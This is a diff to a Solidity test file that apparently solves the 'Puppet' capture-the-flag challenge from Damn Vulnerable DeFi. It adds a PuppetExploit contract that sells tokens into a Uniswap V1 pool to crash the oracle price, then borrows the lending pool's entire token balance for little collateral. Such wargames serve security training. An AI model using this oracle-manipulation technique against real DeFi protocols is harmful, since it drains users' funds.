@@ -92,7 +92,9 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        PuppetExploit exploit = new PuppetExploit{value: PLAYER_INITIAL_ETH_BALANCE}(address(token), address(lendingPool), address(uniswapV1Exchange), recovery);
+        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
+        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +117,31 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract PuppetExploit {
+    DamnValuableToken public token;
+    PuppetPool public lendingPool;
+    IUniswapV1Exchange public uniswapV1Exchange;
+    address public recovery;
+
+    constructor(address _token, address _lendingPool, address _uniswapV1Exchange, address _recovery) payable {
+        token = DamnValuableToken(_token);
+        lendingPool = PuppetPool(_lendingPool);
+        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
+        recovery = _recovery;
+    }
+
+    function attack(uint256 exploitAmount) public {
+        uint256 tokenBalance = token.balanceOf(address(this));
+        // sending dvt tokens to uniswap exchange, increasing their balance and lowering the price
+        // in turn we get eth 
+        token.approve(address(uniswapV1Exchange), tokenBalance);
+
+        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
+        // borrowing all tokens using eth as deposit [payable function with msg.value as 20e18]
+        lendingPool.borrow{value: 20e18}(exploitAmount, recovery);
+    }
+
+    receive() external payable {}
 }
